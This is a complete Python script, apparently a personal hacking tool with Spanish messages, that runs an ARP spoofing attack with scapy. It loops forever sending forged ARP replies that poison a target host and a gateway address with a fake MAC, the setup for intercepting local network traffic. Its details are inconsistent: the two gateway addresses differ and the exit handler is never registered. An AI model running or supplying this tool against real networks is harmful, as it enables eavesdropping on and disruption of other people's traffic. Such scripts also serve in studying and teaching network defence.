#!/usr/bin/env python3

import argparse
import time
import scapy.all as scapy
from termcolor import colored
import signal
import sys

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...",'red'))
    sys.exit(1)


def get_arguments():
    parser = argparse.ArgumentParser(description='ARP Spoofer')
    parser.add_argument("-t", "--target", required=True, dest="ip_address",help="Host / IP range")

    return parser.parse_args()

def spoof(ip_address, spoof_id):
    arp_packet = scapy.ARP(op=2, psrc=spoof_id, pdst=ip_address, hwsrc='aa:bb:cc:44:55:66')
    scapy.send(arp_packet, verbose=False)

def main():

    arguments = get_arguments()
    while True:
        spoof(arguments.ip_address, "192.168.1.1")
        spoof("192.168.100.1", arguments.ip_address)
        time.sleep(1)


if __name__ == '__main__':

    main()
